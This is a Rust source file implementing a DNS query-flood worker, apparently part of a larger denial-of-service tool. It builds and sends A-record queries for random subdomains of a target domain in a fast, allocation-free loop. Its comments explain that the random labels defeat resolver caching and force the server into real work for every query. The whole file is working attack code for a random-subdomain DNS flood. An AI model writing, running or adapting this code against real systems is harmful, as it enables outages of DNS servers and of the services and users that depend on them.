//! DNS query-flood worker (L7 over UDP).
//!
//! Emits A-record queries for random subdomains of the target domain. Random
//! labels defeat resolver/cache dedup, forcing the server to do real recursive
//! or authoritative work per query. Packets are encoded into a reused stack
//! buffer (no heap in the loop); randomness is a per-worker xorshift.

use super::{Governor, Metrics, Shutdown};
use std::net::SocketAddr;
use std::sync::atomic::Ordering::Relaxed;
use std::sync::Arc;
use std::time::Duration;
use tokio::net::UdpSocket;

/// Cheap, allocation-free PRNG for random subdomain labels.
struct XorShift(u64);
impl XorShift {
    #[inline]
    fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }
}

/// Encode a DNS A query for `<rand>.<domain>` into `buf`; returns its length.
fn encode_query(buf: &mut [u8], id: u16, rand: u64, domain: &str) -> usize {
    // Header: ID, flags=0x0100 (RD), QDCOUNT=1, rest 0.
    buf[0..2].copy_from_slice(&id.to_be_bytes());
    buf[2..4].copy_from_slice(&0x0100u16.to_be_bytes());
    buf[4..6].copy_from_slice(&1u16.to_be_bytes());
    buf[6..12].fill(0);
    let mut pos = 12;

    // Random leading label (hex of the PRNG output), then the domain labels.
    let mut tmp = [0u8; 16];
    let mut len = 0;
    let mut r = rand;
    while len < 10 {
        tmp[len] = b"0123456789abcdef"[(r & 0xf) as usize];
        r >>= 4;
        len += 1;
    }
    buf[pos] = len as u8;
    pos += 1;
    buf[pos..pos + len].copy_from_slice(&tmp[..len]);
    pos += len;

    for label in domain.split('.').filter(|l| !l.is_empty()) {
        let lb = label.as_bytes();
        buf[pos] = lb.len() as u8;
        pos += 1;
        buf[pos..pos + lb.len()].copy_from_slice(lb);
        pos += lb.len();
    }
    buf[pos] = 0; // root label
    pos += 1;

    buf[pos..pos + 2].copy_from_slice(&1u16.to_be_bytes()); // QTYPE = A
    buf[pos + 2..pos + 4].copy_from_slice(&1u16.to_be_bytes()); // QCLASS = IN
    pos + 4
}

pub async fn worker(
    idx: u32,
    dest: SocketAddr,
    domain: Arc<str>,
    metrics: Arc<Metrics>,
    gov: Arc<Governor>,
    shutdown: Arc<Shutdown>,
    rate_per_worker: u32,
) {
    let mut down = shutdown.subscribe();
    let bind: SocketAddr = if dest.is_ipv4() {
        "0.0.0.0:0".parse().unwrap()
    } else {
        "[::]:0".parse().unwrap()
    };
    let sock = match UdpSocket::bind(bind).await {
        Ok(s) => s,
        Err(_) => {
            metrics.errors.fetch_add(1, Relaxed);
            return;
        }
    };
    sock.connect(dest).await.ok();

    let mut rng = XorShift(0x9E3779B97F4A7C15 ^ ((idx as u64).wrapping_mul(0x2545F4914F6CDD1D) | 1));
    let mut buf = [0u8; 512];
    let interval =
        (rate_per_worker > 0).then(|| Duration::from_secs_f64(1.0 / rate_per_worker as f64));
    let mut next_tick = tokio::time::Instant::now();

    loop {
        if *down.borrow() {
            return;
        }
        if !gov.active(idx) {
            tokio::select! {
                _ = down.changed() => {}
                _ = tokio::time::sleep(Duration::from_millis(100)) => {}
            }
            continue;
        }
        if let Some(iv) = interval {
            tokio::select! {
                _ = tokio::time::sleep_until(next_tick) => {}
                _ = down.changed() => return,
            }
            next_tick += iv;
        }

        let r = rng.next();
        let n = encode_query(&mut buf, r as u16, r, &domain);
        metrics.requests_sent.fetch_add(1, Relaxed);
        match sock.send(&buf[..n]).await {
            Ok(sent) => {
                metrics.bytes_sent.fetch_add(sent as u64, Relaxed);
                metrics.responses_ok.fetch_add(1, Relaxed);
            }
            Err(_) => {
                metrics.errors.fetch_add(1, Relaxed);
            }
        }
    }
}
